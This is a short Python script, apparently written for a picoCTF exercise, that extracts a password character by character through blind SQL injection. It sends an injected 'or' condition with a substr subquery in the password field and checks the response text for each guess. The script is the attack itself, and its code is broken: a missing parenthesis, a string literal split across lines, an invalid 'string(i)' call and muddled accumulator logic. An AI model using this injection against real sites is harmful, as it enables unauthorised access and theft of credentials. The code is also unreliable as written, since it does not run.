import requests
from string import printable

accum = ""

# Append printable characters to accumulator
for i in range(40):
    for letter in printable:
        accum += letter

        r = requests.post"https://primer.picoctf.prg/vuln/web/blindsql.php?
&username=WeDontCare&password=' or '"
    + letter +"'=( select substr(binary password,"+string(i)+",1) from
pico_blind_injection where id=1 ) and '' = '")

    if 'NOTHING FOUND...' in r.text:
        accum = accum[:-1]                      # removes last element
        print("nope")
    else:
        print(f"We found the character: {letter}")

print(accum)
